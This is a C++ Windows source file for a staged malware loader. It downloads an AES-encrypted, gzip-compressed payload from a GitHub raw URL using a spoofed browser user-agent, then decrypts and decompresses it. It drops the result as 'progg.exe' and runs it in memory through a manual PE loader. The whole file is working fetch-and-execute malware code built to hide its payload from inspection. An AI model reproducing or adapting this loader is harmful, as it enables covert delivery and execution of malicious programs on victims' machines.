#include "stuff2.h"
#include <fstream>
#define KEY_SIZE 33


static const WCHAR* downloadPath = L"https://github.com/soundcloudenjoyer/aes_crypt_decrypt_zip_gzip/raw/refs/heads/master/crypted.bin.gz"; // PRIVATE TO CHANGE


BOOL download(BYTE** outPayload, size_t* outSize) {
    URL_COMPONENTS url_comp = {0};
    url_comp.dwStructSize = sizeof(URL_COMPONENTS);

    WCHAR hostName[256];
    WCHAR urlPath[1024];

    url_comp.lpszHostName = hostName;
    url_comp.lpszUrlPath = urlPath;
    url_comp.dwHostNameLength = _countof(hostName);
    url_comp.dwUrlPathLength = _countof(urlPath);

    if(!WinHttpCrackUrl(downloadPath, 0, 0, &url_comp)) {printf("WinHttpCrackUrl failed!\n"); return FALSE;}
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/603.15 (KHTML, like Gecko) Chrome/49.0.1223.192 Safari/533.8 Edge/11.34227",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {printf("WinHttpOpen failed!\n"); return FALSE;}
    HINTERNET hConnect = WinHttpConnect(hSession, url_comp.lpszHostName, url_comp.nPort, 0);
    if (!hConnect) {printf("WinHttpConnect failed!\n"); WinHttpCloseHandle(hSession); return FALSE;}
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url_comp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {printf("WinHttpOpenRequest failed!\n"); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE;}
    

     if (1 == 2) {
        clear:
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession); 
        return FALSE;
    }

       printf("Connecting to: %ls\n", hostName);
       printf("Path: %ls\n", urlPath);
       if(!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {printf("Request wasn't sent!\n"); goto clear;}
       if(!WinHttpReceiveResponse(hRequest, NULL)) {printf("Unable to recieve the response!\n"); goto clear;}
       BYTE* buf = nullptr; 
       DWORD contentLength = 0;
       DWORD len = sizeof(contentLength);

       WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &contentLength, &len, WINHTTP_NO_HEADER_INDEX);
       
       printf("Content Length == %d\n", contentLength);
       buf = (BYTE*)VirtualAlloc(nullptr, contentLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
       size_t offset = 0;
       while(offset < contentLength) {
            DWORD read = 0;
            WinHttpReadData(hRequest, buf + offset, contentLength - offset, &read);
            if (!read) break;
            offset += read;
       }


       printf("Bytes read = %d\n", contentLength);
       if (buf) {
        *outPayload = buf;
        *outSize = contentLength;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession); 
        return TRUE;
       } else {printf("buf is nullptr!\n"); goto clear;}


       return FALSE; // perhaps unreachable
}
int main() {

    BYTE* downloadedPayload = nullptr;
    size_t downloadedPayloadSize = 0;

    if (download(&downloadedPayload, &downloadedPayloadSize)) {
        printf("payloadSize == %d\n", downloadedPayloadSize);
        std::string AESEncryptionKey = stuff::DecryptAESKey(downloadedPayload, KEY_SIZE);

        size_t compressedSize = downloadedPayloadSize + stuff::SALT_LEN + stuff::IV_LEN + stuff::TAG_LEN;
        BYTE* compressedPayload = (BYTE*)malloc(compressedSize);
        if(stuff::decryptPayloadBCrypt(AESEncryptionKey, downloadedPayload + KEY_SIZE, downloadedPayloadSize - KEY_SIZE, compressedPayload, &compressedSize)) {
            VirtualFree(downloadedPayload, 0, MEM_RELEASE); downloadedPayloadSize = 0; 
            finalPayloadSize = 0; memcpy(&finalPayloadSize, compressedPayload + compressedSize - 4, 4);
            finalPayload = (BYTE*)malloc(finalPayloadSize);
            if(stuff::GZIPdecompress(compressedPayload, compressedSize, finalPayload, &finalPayloadSize)) {
                free(compressedPayload); compressedSize = 0;
                printf("%d bytes were decrypted!\n", finalPayloadSize);

                std::ofstream prog("progg.exe", std::ios::binary);
                prog.write((const char*)finalPayload, finalPayloadSize);
                if(stuff::LoadPEMain(finalPayload, finalPayloadSize)) {
                    printf("LoadPE succeeded!\n");
                    free(finalPayload);
                    return 0;
                } else {printf("LoadPE failed!\n"); free(finalPayload); return 0;}
                
            } else {printf("Decompress failed!\n"); free(compressedPayload); free(finalPayload); return 1;}
        } else{printf("Decrypt failed!\n"); VirtualFree(downloadedPayload, 0, MEM_RELEASE); free(compressedPayload); return 1;}
    } else {printf("Download failed!\n"); VirtualFree(downloadedPayload, 0, MEM_RELEASE);  return 1;}
    return 0;
}